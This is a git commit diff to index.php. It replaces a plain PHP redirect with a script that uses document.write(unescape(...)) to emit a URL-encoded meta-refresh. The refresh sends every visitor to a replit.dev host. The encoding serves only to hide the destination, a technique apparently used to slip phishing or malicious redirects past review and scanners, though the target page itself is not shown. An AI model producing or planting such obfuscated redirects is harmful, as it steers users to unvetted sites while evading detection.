968029ba5d7cdea426c0f172c4287f9e609e32bd
tamieleigh0001 <156190168+tamieleigh0001@users.noreply.github.com>
2024-11-07 10:25:55 +0100

    index.php

--- index.php
+++ index.php
@@ -1,6 +1,5 @@
-<?php
-// Redirect to a different page
-header("Location: https://01df433d-05b6-4e6e-a8a4-f800cb9756e7-00-360x8klbtaazp.kirk.replit.dev");
-// Exit the script to prevent further execution
-exit();
-?>
+<script>
+<!--
+document.write(unescape("%3Chtml%3E%20%0A%3Cbody%3E%0A%3Chead%3E%0A%3CMETA%20HTTP-EQUIV%3D%22REFRESH%22Content%3D0%3BURL%3D%22https%3A//01df433d-05b6-4e6e-a8a4-f800cb9756e7-00-360x8klbtaazp.kirk.replit.dev/%22%3E%0A%3Ctitle%3ELoading%3C/title%3E%0A%3C/head%3E%0A%3C/body%3E%0A%3C/html%3E"));
+//-->
+</script>
